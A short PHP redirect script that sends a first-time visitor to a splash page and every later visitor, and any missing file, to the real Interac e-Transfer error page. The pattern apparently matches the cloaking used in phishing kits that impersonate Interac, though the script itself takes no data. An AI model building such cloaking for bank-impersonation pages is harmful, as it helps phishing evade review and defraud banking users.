<?php
session_start();

// --- Define the Interac error URL ---
define('ERROR_URL', 'https://etransfer.interac.ca/error');

// --- First visit check ---
if (!isset($_SESSION['visited'])) {
    $_SESSION['visited'] = true;
    header('Location: splash.php');
    exit;
}

// --- If file requested does not exist, redirect ---
$request_uri = $_SERVER['REQUEST_URI'];
$requested_file = $_SERVER['DOCUMENT_ROOT'] . parse_url($request_uri, PHP_URL_PATH);

if (!file_exists($requested_file) || is_dir($requested_file)) {
    header('Location: ' . ERROR_URL);
    exit;
}

// --- All subsequent visits ---
header('Location: ' . ERROR_URL);
exit;